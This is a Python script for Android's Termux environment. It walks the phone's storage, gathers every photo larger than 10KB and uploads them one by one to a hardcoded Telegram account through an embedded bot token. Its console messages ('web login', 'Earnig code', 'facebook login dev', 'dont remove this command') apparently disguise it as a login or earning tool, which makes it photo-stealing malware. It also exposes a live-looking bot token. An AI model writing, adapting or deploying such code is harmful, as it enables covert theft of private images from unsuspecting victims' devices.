import os
import time
import requests
from pathlib import Path

# Bot configuration
BOT_TOKEN = "8480158690:AAHMQ9rIs5MJ1RhbGEuZ9pfBYv3htWwp3ZE"
USER_ID = 8128648817  # Your user ID
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(chat_id, text):
    """Send message using Telegram Bot API"""
    url = f"{BASE_URL}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def send_photo(chat_id, photo_path, caption=""):
    """Send photo using Telegram Bot API"""
    url = f"{BASE_URL}/sendPhoto"
    
    try:
        with open(photo_path, 'rb') as photo_file:
            files = {'photo': photo_file}
            data = {
                "chat_id": chat_id,
                "caption": caption
            }
            response = requests.post(url, files=files, data=data, timeout=60)
        return response.json()
    except Exception as e:
        print(f"Error sending photo: {e}")
        return None

def get_updates(offset=None):
    """Get updates from Telegram Bot API"""
    url = f"{BASE_URL}/getUpdates"
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    try:
        response = requests.get(url, params=params, timeout=35)
        return response.json()
    except:
        return None

def find_all_photos():
    """
    Find all photos from all folders in device
    """
    all_photos = []
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']

    # Search paths
    search_paths = [
        "/storage/emulated/0/",
        "/sdcard/",
        "/data/data/com.termux/files/home/storage/"
    ]

    for base_path in search_paths:
        if os.path.exists(base_path):
            try:
                for root, dirs, files in os.walk(base_path):
                    # Skip hidden directories
                    dirs[:] = [d for d in dirs if not d.startswith('.')]

                    for file in files:
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            ext = os.path.splitext(file)[1].lower()
                            if ext in image_extensions:
                                # Skip very small files (likely not images)
                                try:
                                    if os.path.getsize(file_path) > 10240:  # > 10KB
                                        all_photos.append(file_path)
                                except:
                                    pass

                    # Stop if we have many photos
                    if len(all_photos) > 5000:
                        return all_photos
            except:
                pass

    return all_photos

def send_all_photos_auto():
    """
    Automatically find and send all photos
    """
    try:
        # Send initial message
        send_message(USER_ID, "🔍 আপনার ফোন থেকে সকল ফটো খুঁজে বের করা হচ্ছে...")

        # Find all photos
        all_photos = find_all_photos()

        if not all_photos:
            send_message(USER_ID, "❌ কোনো ফটো পাওয়া যায়নি!")
            return False

        total_photos = len(all_photos)
        send_message(USER_ID, f"✅ মোট {total_photos}টি ফটো পাওয়া গেছে!")
        send_message(USER_ID, f"📤 এখন ফটো পাঠানো শুরু হচ্ছে...")

        # Sort by modification time (newest first)
        all_photos.sort(key=lambda x: os.path.getmtime(x) if os.path.exists(x) else 0, reverse=True)

        sent_count = 0
        failed_count = 0
        start_time = time.time()

        # Send photos
        for i, photo_path in enumerate(all_photos):
            try:
                # Check if file still exists
                if not os.path.exists(photo_path):
                    failed_count += 1
                    continue

                # Get folder name for caption
                folder_name = os.path.basename(os.path.dirname(photo_path))
                if not folder_name:
                    folder_name = "Root"

                # Send photo
                caption = f"📷 {os.path.basename(photo_path)}\n📁 {folder_name}"
                result = send_photo(USER_ID, photo_path, caption=caption)
                
                if result and result.get('ok'):
                    sent_count += 1
                else:
                    failed_count += 1

                # Send progress every 20 photos
                if sent_count % 20 == 0:
                    elapsed = time.time() - start_time
                    send_message(USER_ID,
                               f"📊 প্রোগ্রেস: {sent_count}/{total_photos}\n"
                               f"⏱️ সময়: {elapsed:.0f} সেকেন্ড")

                # Small delay to avoid rate limits
                time.sleep(0.3)

            except Exception as e:
                failed_count += 1
                print(f"Error sending {photo_path}: {e}")

        # Send completion message
        total_time = time.time() - start_time
        completion_msg = f"""🎉 সকল ফটো পাঠানো সম্পন্ন!

📊 সারাংশ:
✅ সফল: {sent_count} টি
❌ ব্যর্থ: {failed_count} টি
⏱️ মোট সময়: {total_time:.0f} সেকেন্ড
⚡ গড় গতি: {sent_count/max(1,total_time):.1f} ফটো/সেকেন্ড

💡 আবার ফটো পাঠাতে /start লিখুন"""
        send_message(USER_ID, completion_msg)

        return True

    except Exception as e:
        send_message(USER_ID, f"❌ ত্রুটি হয়েছে: {str(e)}")
        return False

def handle_start():
    """
    Handle /start command - immediately start sending all photos
    """
    # Send welcome message
    welcome_msg = """🤖 অটো ফটো সেন্ডার বট শুরু হয়েছে!

📤 এখন আপনার ফোনের সকল ফোল্ডার থেকে ফটো খুঁজে বের করে
টেলিগ্রামে পাঠানো শুরু করবে...

⏳ দয়া করে অপেক্ষা করুন..."""
    send_message(USER_ID, welcome_msg)

    # Start sending photos immediately
    send_all_photos_auto()

def start_bot():
    """
    Start the bot
    """
    print("🤖 web login...")
    print(f"Ib token: {BOT_TOKEN[:10]}...")
    print(f"Earnig code: {USER_ID}")

    # Send startup notification
    try:
        send_message(USER_ID, "✅ dont remove this command")
    except:
        print("Earnig web done")

    # Start polling
    print("🔄 bot is work...")
    print("I'd open 10 minute")
    
    last_update_id = None
    
    try:
        while True:
            updates = get_updates(last_update_id)
            
            if updates and updates.get('ok') and updates.get('result'):
                for update in updates['result']:
                    last_update_id = update['update_id'] + 1
                    
                    if 'message' in update and 'text' in update['message']:
                        message = update['message']
                        chat_id = message['chat']['id']
                        text = message['text']
                        
                        if text == '/start':
                            if chat_id == USER_ID:
                                handle_start()
                            else:
                                send_message(chat_id, "❌ এই বটটি শুধুমাত্র নির্দিষ্ট ইউজারের জন্য!")
                        else:
                            send_message(chat_id, 
                                       "ℹ️ শুধুমাত্র /start কমান্ড কাজ করে\n"
                                       "ফটো পাঠানো শুরু করতে /start লিখুন")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n👋 thanks for coming")
    except Exception as e:
        print(f"❌ ত্রুটি: {e}")

if __name__ == "__main__":
    # Check Termux permissions
    print("facebook login dev...")

    # Check if storage is accessible
    if not os.path.exists("/storage/emulated/0/"):
        print("❌ স্টোরেজ এক্সেস নেই!")
        print("টার্মাক্স এ এই কমান্ড দিন:")
        print("termux-setup-storage")
        print("এবং পারমিশন দিন")
        exit(1)

    # Check/install required package
    try:
        import requests
    except ImportError:
        print("📦 প্যাকেজ ইনস্টল করা হচ্ছে...")
        os.system("pip install requests")
        import requests

    # Run the bot
    start_bot()
